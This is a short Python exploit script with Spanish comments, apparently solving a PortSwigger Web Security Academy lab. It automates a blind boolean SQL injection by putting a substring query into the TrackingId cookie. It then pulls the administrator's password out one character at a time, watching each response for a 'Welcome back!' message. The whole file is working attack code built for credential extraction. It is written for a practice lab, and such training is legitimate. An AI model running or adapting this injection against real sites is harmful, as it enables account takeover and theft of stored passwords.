#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

# vars
MAIN_URL="https://0aa7000903c058ea82fcbf0500d80084.web-security-academy.net"
CHARS=string.ascii_lowercase + string.digits

# functions
def def_handler(sig, frame):
    print("\nSaliendo...")
    sys.exit(1)

def make_req():
    password=""
    p1=log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p2=log.progress("Password")
    # p3=log.progress("Text")
    for i in range(1, 21):
        for char in CHARS:
            cookies = {
                "TrackingId": "b2lTb6xA3FOfvWeI' and (select substring(password,%d,1) from users where username='administrator')='%s" % (i, char), 
                "session": "2ZJrpp7V4CP3fH7t9EptWaWzuUS7wuaM"
            }

            try:
                p1.status(cookies["TrackingId"])
                r=requests.get(MAIN_URL, cookies=cookies)
                time.sleep(1)
                # p3.status(r.text)
                if "Welcome back!" in r.text:
                    password+=char
                    p2.status(password)
                    #print("Password:", password)
                    break
            
            except Exception as e:
                print("Error:", e)
                sys.exit(1)
    
    p1.success("Password encontrado: %s" % password)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# main
if __name__ == "__main__":
    make_req()
    # time.sleep(10)